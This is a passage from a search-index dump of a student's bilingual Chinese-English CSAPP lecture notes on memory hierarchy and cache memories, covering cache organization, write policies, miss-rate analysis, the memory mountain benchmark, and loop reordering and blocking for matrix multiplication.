| 11  | \n-------------------------\n| 12  | 13  | 14  | 15  | \n-------------------------\n|          ...          | \n-------------------------\n</code></pre> <p>\u7f13\u5b58\u547d\u4e2d\uff1a\u9700\u8981\u7684\u6570\u636e\u5c31\u5728\u7f13\u5b58\u91cc Cache Hit\uff1adata in block b needed.</p> <p>\u7f13\u5b58\u7f3a\u5931\uff08\u7f13\u5b58\u672a\u547d\u4e2d\uff09\uff1a\u9700\u8981\u7684\u6570\u636e\u9700\u8981\u4ece\u4e0b\u7ea7\u53d6\uff08\u4e0d\u5728\u7f13\u5b58\u4e2d\uff09 Cache Miss: block b is fetched from memory.</p> <p>\u7f13\u5b58\u672a\u547d\u4e2d\u7684\u7c7b\u578b Types of Cache Misses</p> <p>\u200b   \u51b7\u4e0d\u547d\u4e2d/\u5f3a\u5236\u4e0d\u547d\u4e2d Cold (compulsory) miss\uff08\u663e\u7136\u8fd9\u79cd\u672a\u547d\u4e2d\u65e0\u6cd5\u907f\u514d\uff0c\u5c06\u6570\u636e\u52a0\u8f7d\u5230\u7a7a\u7f13\u5b58\u4e2d\u79f0\u4e3a\u7f13\u5b58\u7684\u6696\u8eab warming up\uff09</p> <p>\u200b       \u7f13\u5b58\u662f\u7a7a\u7684 Cold misses occur because the cache is empty.</p> <p>\u200b   \u51b2\u7a81\u4e0d\u547d\u4e2d Conflict miss</p> <p>\u200b       \uff08\u8fd9\u79cd\u672a\u547d\u4e2d\u51fa\u73b0\u7684\u539f\u56e0\u662f\u7f13\u5b58\u5fc5\u987b\u8bbe\u8ba1\u6bd4\u8f83\u7b80\u5355\uff0c\u8fd9\u5c31\u5bfc\u81f4\u5176\u9650\u5236\u4e86\u5757\u53ef\u4ee5\u88ab\u653e\u7f6e\u7684\u4f4d\u7f6e\uff0c\u56e0\u6b64\u8fd9\u79cd\u672a\u547d\u4e2d\u4e0e\u7528\u4e8e\u6620\u5c04\u5757\u7684\u7b97\u6cd5\u5bc6\u5207\u76f8\u5173\u3002\uff09</p> <p>\u200b       Most caches limit blocks at level k+1 to a small subset (somtimes a singleton) of the block positions at level k.</p> <p>\u200b           e.g. Block i at level k+1 must be placed in block (i mod 4) at level k.</p> <p>\u200b       Conflict misses occur when the level k cache is large enough, but multiple data objects all map to the same level k block.</p> <p>\u200b           e.g. referencing blocks 0, 8, 0, 8, 0, 8, 0, 8, ... would miss every time.</p> <p>\u200b   \u5bb9\u91cf\u4e0d\u547d\u4e2d Capacity miss</p> <p>\u200b       \u7f13\u5b58\u5927\u5c0f\u6709\u9650\uff0c\u4f60\u7684\u5de5\u4f5c\u96c6\u5927\u5c0f\u6bd4\u7f13\u5b58\u5927 Occurs when the set of active cache blocks (working set) is larger than the cache.\uff08\u6211\u4eec\u79f0\u547c\u4e00\u5b9a\u65f6\u95f4\u5185\u53cd\u590d\u8bbf\u95ee\u7684\u6570\u636e\u6784\u6210\u5de5\u4f5c\u96c6\uff0c\u5bf9\u5e94\u5230\u66f4\u9ad8\u4e00\u7ea7\u7684\u62bd\u8c61\uff0c\u53ef\u80fd\u5c31\u662f\u4e00\u4e2a\u5faa\u73af\u6216\u51fd\u6570\u5185\u53cd\u590d\u8c03\u7528\u7684\u6570\u7ec4\u3002\uff09</p> <p>Examples of Caching in the Memory Hierarchy</p> Cache Type What is cached? Where is it cached? Latency (cycles) Managed by Registers 4-8 bytes words CPU core 0 Compiler TLB Address translations On-Chip TLB 0 Hardware MMU L1 cache 64-byte blocks On-Chip L1 4 Hardware L2 cache 64-byte blocks On-Chip L2 10 Hardware Virtual Memory 4-KB pages Main memory 100 Hardware + OS Buffer cache Parts of files Main memory 100 OS Disk cache Disk sectors Disk controller 100,000 Disk firmware Network buffer cache Parts of files Local disk 10,000,000 NFS client Browser cache Web pages Local disk 10,000,000 Web cache Web pages Remote server disks 1,000,000,000 <p>\u6ce8\uff1a</p> <p>\u200b   \u7ffb\u8bd1\u540e\u5907\u7f13\u51b2\uff08TLB, translation lookaside buffer\uff09\u662f\u4e00\u4e2a\u5728\u865a\u62df\u5185\u5b58\u4e2d\u4f7f\u7528\u7684\u7f13\u5b58\u3002</p> <p>\u200b   \u64cd\u4f5c\u7cfb\u7edf\uff08OS, operating system\uff09\u3002</p> <p>\u200b   \u7f13\u51b2\u533a\u7f13\u5b58\uff08buffer cache\uff09</p> <p>\u200b   \u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff08network file system\uff09\u548c\u5b89\u5fb7\u9c81\u6587\u4ef6\u7cfb\u7edf\uff08andrew file system\uff09\u3002</p> <p>\u200b   \u6d4f\u89c8\u5668\u7f13\u5b58\uff08cache browser\uff09\u3002</p> <p>Summary</p> <p>\u200b   The speed gap between CPU, memory and mass storage continues to widen.</p> <p>\u200b   Well-written programs exhibit a property called locality.</p> <p>\u200b   Memory hierarchies based on caching close the gap by exploiting locality.</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L12-Cache-Memories/","title":"L12 Cache Memories","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=12</p> <p>Today</p> <p>\u200b   \u7f13\u5b58\u7ed3\u6784\u53ca\u5176\u64cd\u4f5c Cache organization and operation</p> <p>\u200b   \u7f13\u5b58\u5bf9\u8868\u73b0\u7684\u91cd\u5927\u5f71\u54cd Performance impact of caches</p> <p>\u200b       \u5b58\u50a8\u5668\u5c71 The memory mountain</p> <p>\u200b       \u91cd\u6392\u5faa\u73af\u4ee5\u63d0\u5347\u7a7a\u95f4\u5c40\u90e8\u6027 Rearranging loops to improve spatial locality</p> <p>\u200b       \u4f7f\u7528\u5206\u5757\u6280\u5de7\u4ee5\u63d0\u5347\u65f6\u95f4\u5c40\u90e8\u6027 Using blocking to improve temporal locality</p> <p>Cache memories\uff08\u9ad8\u901f\u7f13\u5b58\u5b58\u50a8\u5668\uff09</p> <p>\u200b   cache memories are small, fast SRAM-based memories managed automatically in hardware.</p> <p>\u200b       Hold frequently accessed blocks of main memory.</p> <p>\u200b   CPU looks first for data in cache.</p> <p>\u200b   Typical system structure: CPU chip &lt;-&gt; I/O bridge &lt;-&gt; Main memory</p> <p>\u901a\u7528\u7684\u7f13\u5b58\u7ed3\u6784 General Cache Organization (S, E, B)    </p> <pre><code>               E = 2^e lines per set\uff08\u884c\uff09\n --------------|--------------\n/                             \\\n-------------------------------  \\\n|    |    |    |    |    |    |   |\n-------------------------------   |\n|    |    |    |    |    |    |   |\n-------------------------------   |\n|    |    |    |    |    |    |   S = 2^s sets\uff08\u7ec4\uff09\n-------------------------------   |\n|    |    |    |    |    |    |   |\n-------------------------------   |\n|    |    |    |    |    |    |   |\n-------------------------------   /\n</code></pre> <p>\u9ad8\u901f\u7f13\u5b58\u5b58\u50a8\u5668\u5b8c\u5168\u7531\u786c\u4ef6\u7ba1\u7406\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u9ad8\u6821\u5730\u67e5\u627e\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u4ee5\u975e\u5e38\u4e25\u683c\u4e14\u7b80\u5355\u5730\u65b9\u5f0f\u53bb\u7ec4\u7ec7\u9ad8\u901f\u7f13\u5b58\u5b58\u50a8\u5668\u3002</p> <p>\u6211\u4eec\u4ece\u8fd9\u4e2a\u7ed3\u6784\u56fe\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u6bcf\u4e2a\u7f13\u5b58\u542b\u6709 S \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u5185\u6709 E \u884c\uff0c\u6bcf\u4e00\u884c\u7531\u4e00\u4e2a B = 2^b \u5b57\u8282\u7684\u6570\u636e\u5757\u7ec4\u6210\uff0c\u53e6\u5916\u5b58\u5728\u4e00\u4e2a\u6709\u6548\u4f4d\uff08valid bit\uff09\uff0c\u6307\u793a\u8fd9\u4e9b\u6570\u636e\u4f4d\u548c\u6570\u636e\u5757\u5b9e\u9645\u4e0a\u662f\u5b58\u5728\u7684\uff1b\u53e6\u5916\u53ef\u80fd\u8fd8\u5b58\u5728\u6807\u7b7e\u4f4d\uff08tag bits\uff09\u7528\u4e8e\u6307\u793a\u7f13\u5b58\u67e5\u627e\u3002</p> <p>\u7f13\u5b58\u5927\u5c0f C \u662f\u5757\u4e2d\u5305\u542b\u7684\u6570\u636e\u5b57\u8282\u6570\uff0c\u663e\u7136 C = S * E * B.</p> <p>Cache Read </p> <p>\u200b   \u5bf9\u4e8e\u4e00\u4e32\u5730\u5740\uff0c\u5728 x86-64 \u4e2d\u662f 64 \u4f4d\uff0c\u5176\u88ab\u5212\u5206\u4e3a t + s + b \u4f4d\uff08\u4ece\u9ad8\u5230\u4f4e\uff09\uff0c\u5176\u4e2d t \u4f4d tag\u3001s \u4f4d set index\u3001b \u4f4d block offset. </p> <p>E = 1 \u7684\u9ad8\u901f\u7f13\u5b58\u79f0\u4e3a\u76f4\u63a5\u6620\u5c04\u9ad8\u901f\u7f13\u5b58\uff08direct mapped cache\uff09</p> <p>\u200b   \u9996\u5148\uff0c\u63d0\u53d6 s \u4f4d set index\uff0c\u627e\u5230\u5bf9\u5e94\u7ec4\u3002</p> <p>\u200b   \u5176\u6b21\uff0c\u68c0\u67e5 t \u4f4d\u6807\u7b7e\u4f4d\uff0c\u67e5\u770b\u662f\u5426\u6709\u5339\u914d\u7684\u884c\uff0c\u5f53\u7136\u6709\u6548\u4f4d\u5e94\u6307\u793a\u5b58\u5728\uff1b\u5426\u5219\u79f0\u672a\u547d\u4e2d\uff0c\u505a\u4e00\u4e9b\u64cd\u4f5c\u3002</p> <p>\u200b   \u6700\u540e\uff0c\u6839\u636e b \u4f4d\u627e\u5230\u5bf9\u5e94\u5b57\u8282\u3002</p> <p>\u200b   \u6b64\u5904\u672a\u547d\u4e2d\u9700\u8981\u505a\u8fd9\u6837\u7684\u64cd\u4f5c\uff1a\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u503c\uff0c\u4fee\u6539\u8be5\u884c\u6709\u6548\u4f4d\uff08valid bit\uff09\u4e3a 1\uff0c\u5e76\u8986\u76d6\u8be5\u884c tag \u7684\u503c\u3002</p> <p>\u200b   If tag doesn't match: \u65e7\u884c\u88ab\u64a4\u9664\u5e76\u88ab\u66ff\u6362 old line is evicted and replaced.</p> <p>\u200b   \u6362\u53e5\u8bdd\u8bf4\uff0c\u6bcf\u4e00\u884c\u7ba1\u5185\u5b58\u4e00\u90e8\u5206\uff0ctag \u6784\u6210\u5bf9\u5176\u4e2d\u4e00\u90e8\u5206\u4e2d\u6570\u636e\u7684\u6563\u5217\uff08hashing\uff09\uff0c\u56e0\u4e3a\u6b64\u65f6 E = 1\uff0c\u6240\u4ee5\u65e0\u8bba\u662f tag \u672a\u5339\u914d\uff0c\u8fd8\u662f\u5339\u914d\u4f46 v = 0\uff0c\u663e\u7136\u90fd\u662f\u672a\u547d\u4e2d\uff0c\u4e8e\u662f\u5c06\u5185\u5b58\u5bf9\u5e94\u6570\u636e\u585e\u8fdb\u6765\u3002\u3010\u8fd9\u4e2a\u8bbe\u8ba1\u4e00\u4e2a tag \u4f5c\u4e3a\u6563\u5217\u592a\u795e\u79d8\u4e86\uff0c\u53ef\u80fd\u8981\u914d\u5408\u4ec0\u4e48\u4e1c\u897f\uff1f\u8001\u5e08\u548c\u4e66\u4e0a\u5173\u4e8e\u8fd9\u90e8\u5206\u90fd\u8bb2\u5f97\u4e0d\u6e05\u695a\uff0chashing \u662f\u6211\u81ea\u5df1\u603b\u7ed3\u7684\uff0c\u4e0d\u8fc7\u4e8b\u5b9e\u4e0a\u6765\u770b\u8fd9\u4e2a hashing \u5c31\u662f\u5f88\u7b80\u5355\u7684\u53d6\u5934\u7684 hashing function\uff0c\u5b9e\u73b0\u5f88\u7b80\u5355\u3002\u6545\u800c\u8fd9\u91cc\u6700\u795e\u79d8\u7684\u662f t + s + b \u7684\u9ad8\u4f4e\u4f4d\u6392\u5e8f\uff0c\u6362\u6210 s + t + b \u672a\u547d\u4e2d\u7387\u4f1a\u66f4\u4f4e\u5417\uff0c\u6211\u4e0d\u77e5\u9053\uff0c\u4f46\u5e94\u8be5\u4f1a\u66f4\u9ad8\uff0c\u8fd9\u662f\u56e0\u4e3a\u7a7a\u95f4\u5c40\u90e8\u6027\uff0c\u6240\u4ee5 s \u653e\u5728\u4e2d\u95f4\u662f\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u60f3\u6cd5\uff0c\u4e0d\u8fc7 t + s + b \u662f\u6700\u597d\u7684\u5417\uff0c\u6211\u4e0d\u77e5\u9053\u3002\u3011</p> <p>\u200b   \u53e6\u5916\u8fd8\u9700\u6ce8\u610f\u8fd9\u4e2a offset\uff0c\u8fd9\u8868\u660e\u8bfb\u53d6\u7684\u662f\u5757\u5185\u76f8\u5bf9\u7684\u4f4d\u7f6e\u7684\u5b57\u8282\u3002\u3010\u8fd9\u4e2a offset \u7684\u673a\u5236\u4e5f\u6ca1\u600e\u4e48\u8bb2\u6e05\u695a\uff0c\u8bf4\u660e\u767d\u662f\u5757\u5185 2^b \u4e2a\u5b57\u8282\u4e2d\u5177\u4f53\u7684\u67d0\u4e2a\u5b57\u8282\u4e0d\u597d\u4e48\uff0c\u975e\u8981\u5f3a\u8c03\u4e00\u4e2a offset \u641e\u5f97\u6211\u8fd8\u4ee5\u4e3a\u8981\u52a0\u51cf\u4ec0\u4e48\u4e1c\u897f\uff0c\u65e0\u8a00\u4e86\u3002\u3011</p> <p>E &gt; 1 \u7684\u9ad8\u901f\u7f13\u5b58\u79f0\u4e3a E \u8def\u7ec4\u76f8\u8fde\u9ad8\u901f\u7f13\u5b58\uff08E-way set associative cache\uff09</p> <p>\u200b   \u7279\u522b\u5730\uff0c\u5982\u679c S = 1\uff0c\u5219\u79f0\u4e3a\u5168\u76f8\u8fde\u9ad8\u901f\u7f13\u5b58\uff08fully associative caches\uff09\u3002</p> <p>\u200b   \u9996\u5148\uff0c\u63d0\u53d6 s \u4f4d set index\uff0c\u627e\u5230\u5bf9\u5e94\u7ec4\u3002</p> <p>\u200b   \u5176\u6b21\uff0c\u68c0\u67e5 t \u4f4d\u6807\u7b7e\u4f4d\uff0c\u5728 E \u884c\u4e2d\u5e76\u884c\u5339\u914d\u3002</p> <p>\u200b   \u5982\u679c\u5339\u914d\u4e0a\u4e86\u5e76\u4e14\u6709\u6548\u4f4d\u6307\u793a\u5b58\u5728\uff0c\u5219\u79f0\u7f13\u5b58\u547d\u4e2d\u3002</p> <p>\u200b   \u672a\u547d\u4e2d\u8fd8\u662f\u5c06\u5185\u5b58\u5199\u5165\uff0c\u5982\u679c\u672a\u5339\u914d\u4e0a\uff0c\u5219\u4f18\u5148\u5199\u5165\u7a7a\u69fd\uff0c\u4e4b\u540e\u6309\u987a\u5e8f\u5199\u5165\u884c\uff1b\u5982\u679c\u6709\u6548\u4f4d\u6307\u793a\u65e0\u6548\uff0c\u5219\u66f4\u6539\u6709\u6548\u4f4d\u5e76\u5199\u5165\u3002</p> <p>\u200b   \u6700\u540e\uff0c\u6839\u636e b \u6765\u67e5\u5757\u5185\u76f8\u5bf9\u4f4d\u7f6e\u7684\u5b57\u8282\u3002</p> <p>\u200b   No match:</p> <p>\u200b       One line in set is selected for eviction and replacement.</p> <p>\u200b       Replacement policies: random, least recently used (LRU), ...</p> <p>\u5206\u4e3a\u8fd9\u4e24\u7c7b\u60c5\u51b5\uff0c\u662f\u56e0\u4e3a hashing \u7684\u5b58\u5728\u5c31\u4f1a\u4f7f\u5f97 E \u7684\u591a\u5c11\u6709\u4e2a\u6743\u8861\uff08trade-off\uff09\uff0cE \u5c0f\u4f1a\u5bfc\u81f4\u51b2\u7a81\u6b21\u6570\u589e\u52a0\uff0c\u4e5f\u5c31\u63d0\u9ad8\u4e86\u672a\u547d\u4e2d\u7387\uff0cE \u5927\u5219 hashing \u5339\u914d\u5c31\u5bf9\u7b97\u6cd5\u63d0\u51fa\u4e86\u8981\u6c42\uff0c\u4e0d\u8fc7\u5728 E \u4e0d\u8fc7\u5927\u65f6\uff0c\u8fd9\u6837\u53bb\u8981\u6c42\u590d\u6742\u7684\u7b97\u6cd5\u8fd8\u662f\u5f88\u503c\u5f97\u7684\uff0c\u6545\u800c E = 2 \u7684\u60c5\u5f62\u662f\u5f88\u503c\u5f97\u4e00\u63d0\u7684\u3002</p> <p>\u53e6\u5916\u7f13\u5b58\u5e94\u4fdd\u6301\u6570\u636e\u4e00\u81f4\u6027\uff0c\u5373\u5199\u5165\u6570\u636e\u65f6\uff0c\u5f53\u56e0\u4e3a\u672a\u547d\u4e2d\uff0c\u7f13\u5b58\u8981\u8e39\u4e0b\u8fd9\u90e8\u5206\u6570\u636e\u65f6\uff0c\u6570\u636e\u5e94\u56de\u5199\u81f3\u5185\u5b58\u4ee5\u4fdd\u8bc1\u6570\u636e\u4e00\u81f4\uff0c\u4e5f\u5373\u6570\u636e\u771f\u7684\u88ab\u5199\u5165\uff08\u66f4\u6539\uff09\u4e86\uff0c\u800c\u4e0d\u662f\u505c\u7559\u5728\u7f13\u5b58\u8fd8\u88ab\u8986\u76d6\uff08\u8fd9\u610f\u5473\u7740\u5199\u5165\u6570\u636e\u4e22\u5931\uff09\u3002\u3010\u6b64\u884c\u5bf9\u5e94\u4e0b\u6587 write-back\u3011</p> <p>\u53e6\u5916\u6b64\u5904\u6709\u5b66\u751f\u95ee\u5230\u53c2\u6570\u8bbe\u8ba1\uff0c\u53ea\u80fd\u8bf4\u7f13\u5b58\u8bbe\u8ba1\u5982\u6b64\u590d\u6742\uff0c\u4f46\u6bcf\u4e00\u6b65\u53c8\u5f88\u7b80\u5355\uff0c\u662f\u9700\u6c42\u5bfc\u81f4\u7684\u8bbe\u8ba1\uff0c\u6240\u6709\u53c2\u6570\u90fd\u5fc5\u987b\u9002\u5f53\uff0cE \u7684\u5927\u5c0f\u5df2\u8bf4\u660e\u3002S \u6216 B \u8fc7\u5927\u663e\u7136\u4f1a\u6269\u5927\u7f13\u5b58\uff0c\u8fd9\u5c31\u964d\u4f4e\u4e86\u7f13\u5b58\u7684\u6027\u80fd\uff0c\u4f46 S \u8fc7\u5c0f\u6216 B \u8fc7\u5c0f\u5fc5\u7136\u5bfc\u81f4\u5176\u4f59\u7684\u90e8\u5206\u8fc7\u5927\uff0c\u8fdb\u800c\u5bfc\u81f4\u672a\u547d\u4e2d\u7387\u589e\u52a0\u3002</p> <p>What about writes?</p> <p>\u200b   Multiple copies of data exists.</p> <p>\u200b       L1, L2, L3, Main Memory, Disk.</p> <p>\u200b   What to do on a write-hit?</p> <p>\u200b       Write-through (write immediately to memory)</p> <p>\u200b       Write-back (defer write to memory until replacement of line)</p> <p>\u200b            \u9700\u8981\u4e00\u4e9b\u4fee\u6539\u4f4d\u6765\u8bf4\u660e\u662f\u5426\u5411\u4e0b\u5199\u4e86 Need a dirty bit (line different from memory or not)</p> <p>\u200b   What to do on a write-miss?</p> <p>\u200b       \u6682\u65f6\u5199\u5165\u5230\u7f13\u5b58\uff0c\u4e4b\u540e\u518d\u5411\u4e0b\u5199 Write-allocate (load into cache, update line in cache)</p> <p>\u200b           Good if more writes to the location follow.</p> <p>\u200b       \u76f4\u63a5\u5199\u5165\u5185\u5b58\uff0c\u4e0d\u5199\u5165\u5230\u7f13\u5b58 No-write-allocate (writes straight to memory, does not load into cache)</p> <p>\u200b   Typical</p> <p>\u200b       Write-through + No-write-allocate</p> <p>\u200b       Write-back + Write-allocate</p> <p>\u4e24\u8005\u5404\u6709\u5229\u5f0a\uff0c\u4e00\u4e2a\u662f\u82b1\u8d39\u65f6\u95f4\u4f46\u4fdd\u7559\u5185\u5b58\u548c\u5176\u5c40\u90e8\u6027\uff0c\u4e00\u4e2a\u662f\u65f6\u95f4\u77ed\u4f46\u6467\u6bc1\u4e86\u5355\u72ec\u8bfb\u5165\u6216\u5355\u72ec\u5199\u5165\u7684\u5c40\u90e8\u6027\uff08\u4e8c\u8005\u6df7\u5728\u4e00\u8d77\u4e86\uff09\u3002</p> <p>Intel Core i7 Cache Hierarchy (39:46)</p> <p>\u5728\u5b9e\u9645\u7cfb\u7edf\u4e2d\uff0c\u4f1a\u5b58\u5728\u591a\u4e2a\u7f13\u5b58\u3002</p> <p></p> <p>Cache Performance Metrics</p> <p>\u200b   Miss Rate</p> <p>\u200b       Fraction of memory references not found in cache (misses / accesses) = 1 - hit rate</p> <p>\u200b       Typical numbers (in percentage)</p> <p>\u200b           3-10% for L1</p> <p>\u200b           can be quite samll (e.g. &lt; 1%) for L2, depending on size, etc.</p> <p>\u200b   Hit Time</p> <p>\u200b       Time to deliver a line in the cache to the processor</p> <p>\u200b           includes time to determine whether the line is in the cache.</p> <p>\u200b       Typical numbers:</p> <p>\u200b           4 clock cycle for L1</p> <p>\u200b           10 clock cycle for L2</p> <p>\u200b   Miss Penalty</p> <p>\u200b       Additional time required because of a miss.</p> <p>\u200b           typically 50-200 cycles for main memory (Trend: increasing                    !).</p> <p>Let's think about those numbers</p> <p>\u200b   Huge differences between  a hit and a miss.</p> <p>\u200b       Could be 100X, if just L1 and main memory.</p> <p>\u200b   Would you believe 99% hits is twice as good as 97%?</p> <p>\u200b       consider: cache hit time of 1 cycle and miss penalty of 100 cycles.</p> <p>\u200b       Average access time:</p> <p>\u200b           97% hits: 1 cycle + 0.03 * 100 cycles = 4 cycles.</p> <p>\u200b           99% hits: 1 cycle + 0.01 * 100 cycles = 2 cycles.</p> <p>\u672a\u547d\u4e2d\u7684\u65f6\u95f4\u5373\u547d\u4e2d\u65f6\u95f4\u52a0\u672a\u547d\u4e2d\u60e9\u7f5a\u3002</p> <p>Writing Cache Friendly Code</p> <p>\u200b   Make the common case go fast</p> <p>\u200b       Focys on the inner loops of the core functions</p> <p>\u200b   Minimize the misses in the inner loops</p> <p>\u200b       \u91cd\u590d\u5f15\u7528\u4e00\u4e2a\uff08\u653e\u5728\u5bc4\u5b58\u5668\u4e2d\u7684\uff09\u53d8\u91cf Repeated references to variable are good (temporal locality)</p> <p>\u200b       \u8bbf\u95ee\u6570\u7ec4\u65f6\u7684\u6b65\u957f\u4e3a\u4e00 Stride-1 reference patterns are good.</p> <p>\u200b   Key idea: Our qualitative notion of locality is quantified through our understanding of cache memories.</p> <p>\u5b58\u50a8\u5668\u5c71 The Memory Mountain</p> <p>\u200b   \u4f5c\u4e3a\u63cf\u8ff0\u8bfb\u53d6\u541e\u5410\u91cf\uff08\u8bfb\u53d6\u5e26\u5bbd\uff09\u7684\u6807\u51c6 Read throughput (read bandwidth)</p> <p>\u200b       \u6bcf\u79d2\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u7684\u5b57\u8282\u6570\uff08\u5355\u4f4d\uff1aMB/s\uff09 Number of bytes read from memory per second (MB/s)</p> <p>\u200b   Memory mountain: Measured read throughput as a function of spatial and temporal locality.</p> <p>\u200b       Compact way to characterize memory system performance.</p> <p>\u6bcf\u4e2a\u7cfb\u7edf\u7684\u5b58\u50a8\u5668\u5c71\u90fd\u4e0d\u540c\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7a0b\u5e8f\u6765\u8861\u91cf\uff1a</p> <pre><code>long data[MAXELEMS]; /* Global array to traverse */\n\n/* test - Iterate over first \"elems\" elements of \n *        array \"data\" with stride of \"stride\", using\n *        using 4x4 loop unrolling.\n */\nint test(int elems, int stride) {\n    long i, sx2=stride*2, sx3=stride*3, sx4=stride*4;\n    int acc0 = 0, acc1 = 0, acc2 = 0, acc3 = 0;\n    long length = elems, limit = length - sx4;\n\n    /* Combine 4 elements at a time */\n    for (i = 0; i &lt; limit; i += sx4) {\n        acc0 = acc0 + data[i];\n        acc1 = acc1 + data[i+stride];\n        acc2 = acc2 + data[i+sx2];\n        acc3 = acc3 + data[i+sx3];\n    }\n\n    /* Finish any remaining elements */\n    for (; i &lt; length; i++) {\n        acc0 = acc0 + data[i];\n    }\n    return ((acc0 + acc1) + (acc2 + acc3));\n} // mountain/mountain.c\n</code></pre> <p>Call <code>test()</code> with many combinations of <code>elems</code> and <code>stride</code>.</p> <pre><code>For each elems and stride:\n1. Call test() onece to warm up the caches.\n2. Call test() again and measure the read throughput (MB/s).\n</code></pre> <p></p> <p>\u80fd\u770b\u51fa\u6765\u8fd9\u6709\u56db\u4e2a\u9636\u68af\uff0c\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u662f L1, L2, L3, Mem\uff0cPPT \u79f0\u547c\u8fd9\u662f Ridges\uff08\u5c71\u810a\uff09 of temporal locality.</p> <p></p> <p>Rearrange Loops: Matrix Multiplication Example</p> <p>\u200b   Description:</p> <p>\u200b       Multiply N x N matrices.</p> <p>\u200b       Matrix elements are doubles (8 bytes).</p> <p>\u200b       O(N^3) total operations.</p> <p>\u200b       N reads per source element.</p> <p>\u200b       N values summed per destination.</p> <p>\u200b           but may be able to hold in register.</p> <pre><code>/* ijk */\nfor (i = 0; i &lt; n; i++) {\n    for (j = 0; j &lt; n; j++) {\n        sum = 0.0;\n        for (k = 0; k &lt; n; k ++)\n            sum += a[i][k] * b[k][j];\n        c[i][j] = sum;\n    }\n}\n</code></pre> <p>Miss Rate Analysis for Matrix Multiply</p> <p>\u200b   Assume:</p> <p>\u200b       Block size = 32B (big enough for four doubles)</p> <p>\u200b       Matrix dimension (N) is very large.</p> <p>\u200b           Approximate 1/N as 0..</p> <p>\u200b       Cache is not even big enough to hold multiple rows.</p> <p>\u200b   Analysis Method:</p> <p>\u200b       Look at access pattern of inner loop.</p> <p>Matrix Multiplication (ijk)</p> <p>\u200b   Misses per inner loop iteration:</p> <p>\u200b       A: Row-wise, 0.25</p> <p>\u200b       B: Column-wise: 1.0</p> <p>\u200b       C: Fixed: 0.0</p> <p>\u200b       Total: 1.25 out of 3</p> A B C total ijk 0.25 1.0 0.0 1.25 jik 0.25 1.0 0.0 1.25 kij 0.0 0.25 0.25 0.50 ikj 0.0 0.25 0.25 0.50 jki 1.0 0.0 1.0 2.00 kji 1.0 0.0 1.0 2.00 <p>Summary of Matrix Multiplication:</p> <p>\u200b   ijk &amp; jik: 2 loads, 0 stores, misses/iter = 1.25.</p> <p>\u200b   kij &amp; ikj: 2 loads, 1 stores, misses/iter = 0.5.</p> <p>\u200b   jki &amp; kji: 2 loads, 1 stores, misses/iter = 2.0.</p> <p>\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u5199\u5165\u7684\u95ee\u9898\uff0c\u5728\u4efb\u4f55\u7c7b\u578b\u7684\u5b58\u50a8\u7cfb\u7edf\u4e2d\u90fd\u8bc1\u660e\u4e86\uff1a\u6240\u6709\u8bfb/\u5199\u7684\u64cd\u4f5c\uff0c\u5199\u90fd\u8981\u6bd4\u8bfb\u8981\u66f4\u5bb9\u6613\u3002</p> <p>\u200b   \u5173\u952e\u5728\u4e8e\u5199\u53ef\u4ee5\u63a8\u8fdf\uff0c\u61d2\u60f0\u6cd5\u5199\uff1b\u4f46\u8bfb\u4e0d\u53ef\u4ee5\u3002</p> <p></p> <p>\u4f7f\u7528\u5206\u5757\u6280\u5de7\uff08Using Blocking\uff09</p> <pre><code>c = (double *) calloc(sizeof(double), n*n);\n\n/* Multiply n x n matrices a and b */\nvoid mmm(double *a, double *b, double *c, int n) {\n    int i, j, k;\n    for (i = 0; i &lt; n; i++)\n        for (j = 0; j &lt; n; j++)\n            for (k = 0; k &lt; n; k++)\n                c[i*n + j] += a[i*n + k] * b[k*n + j];\n}\n</code></pre> <p>Cache Miss Analysis</p> <p>\u200b   Assume:</p> <p>\u200b       Matrix elements are doubles.</p> <p>\u200b       Cache block = 8 doubles.</p> <p>\u200b       Cache size C &lt;&lt; n (much smaller than n)</p> <p>\u200b   Each Iteration:</p> <p>\u200b       n/8 + n = 9n/8 misses.</p> <p>\u200b   Total misses:</p> <p>\u200b       9n/8 * n^2 = 9n^3/8</p> <p>Blocked Matrix Multiplication</p> <pre><code>c = (double *) calloc(sizeof(double), n*n);\n\n/* Multiply n x n matrices a and b */\nvoid mmm2(double *a, double *b, double *c, int n) {\n    int i, j, k, i1, j1, k1;\n    for (i = 0; i &lt; n; i+=B)\n        for (j = 0; j &lt; n; j+=B)\n            for (k = 0; k &lt; n; k+=B)\n                for (i1 = i; i1 &lt; i+B; i1++)\n                    for (j1 = j; j1 &lt; j+B; j1 ++)\n                        for (k1 = k; k1 &lt; k+B; k1++)\n                            c[i1*n + j1] += a[i1*n + k1] * b[k1*n + j1];\n}\n</code></pre> <p>\u54ce\uff0c\u5206\u5757\u77e9\u9635\u4e58\u6cd5\u3002</p> <p>Cache Miss Analysis</p> <p>\u200b   Assume:</p> <p>\u200b       Cache block = 8 doubles.</p> <p>\u200b       Cache size C &lt;&lt; n (much smaller than n)</p> <p>\u200b       Three blocks fit into cache: 3B^2 &lt; C</p> <p>\u200b   Each Iteration:</p> <p>\u200b       B^2/8 misses for each block.</p> <p>\u200b       2n/B * B^2/8 = nB/4 (omitting matrix c)</p> <p>\u200b   Totla misses:</p> <p>\u200b       nB/4 * (n/B)^2 = n^3/(4B).</p> <p>\u200b   Suggest largest possible block size B, but limit 3B^2 &lt; C.</p> <p>\u200b   Reason for dramatic difference:</p> <p>\u200b       Matrix multiplication has inherent temporal locality:</p> <p>\u200b           Input data: 3n^2, computation 2n^3</p> <p>\u200b           Every array elements used O(n) times!</p> <p>\u200b       But program has to be written property.</p> <p>Cache Summary</p> <p>\u200b   Cache memories can have significant performance impact.</p> <p>\u200b   You can write your programs to exploit this!</p> <p>\u200b       Focus on the inner loops, where bulk of computations and memory accesses occur.</p> <p>\u200b       Try to maximize spatial locality by reading data objects with sequentially with stride 1.</p> <p>\u200b       Try to maximize temporal locality by using a data object as often as possible once it's read from 